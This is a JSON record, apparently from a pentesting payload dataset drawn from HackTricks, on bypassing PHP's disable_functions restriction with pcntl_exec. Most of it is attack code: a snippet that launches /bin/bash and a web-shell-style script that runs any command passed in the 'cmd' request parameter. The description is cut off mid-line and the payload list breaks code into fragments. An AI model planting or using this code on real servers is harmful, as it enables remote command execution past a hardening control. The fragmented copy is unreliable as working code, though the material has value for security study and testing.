{
  "id": "network_services_pentesting_017fdcc7d138",
  "category": "network-services-pentesting",
  "title": "disable functions bypass php 4 greater than 4.2.0 php 5 pcntl exec",
  "description": "# PHP 4 &gt;= 4.2.0, PHP 5 pcntl_exec\n\n{{#include ../../../../banners/hacktricks-training.md}}\n\n\nFrom [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)\n\n```php\n<?php\n$dir = '/var/tmp/';\n$cmd = 'ls';\n$option = '-l';\n$pathtobin = '/bin/bash';\n\n$arg = array($cmd, $option, $dir);\n\npcntl_exec($pathtobin, $arg);\necho '123';\n?>\n<?php\n$cmd = @$_REQUEST[cmd];\nif(function_exists('pcntl_exec')) {\n    $cmd = $cmd.\"&pkill -9 bash >o",
  "payloads": [
    "# PHP 4 &gt;= 4.2.0, PHP 5 pcntl_exec",
    "{{#include ../../../../banners/hacktricks-training.md}}",
    "From [http://blog.safebuff.com/2016/05/06/disable-functions-bypass/](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)",
    "```php",
    "$dir = '/var/tmp/';",
    "$cmd = 'ls';",
    "$option = '-l';",
    "$pathtobin = '/bin/bash';",
    "$arg = array($cmd, $option, $dir);",
    "pcntl_exec($pathtobin, $arg);",
    "echo '123';",
    "$cmd = @$_REQUEST[cmd];",
    "if(function_exists('pcntl_exec')) {",
    "$cmd = $cmd.\"&pkill -9 bash >out\";",
    "pcntl_exec(\"/bin/bash\", $cmd);"
  ],
  "source": "HackTricks",
  "references": [
    "/workspaces/hunter-skill/hacktricks/src/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/disable_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl_exec.md"
  ]
}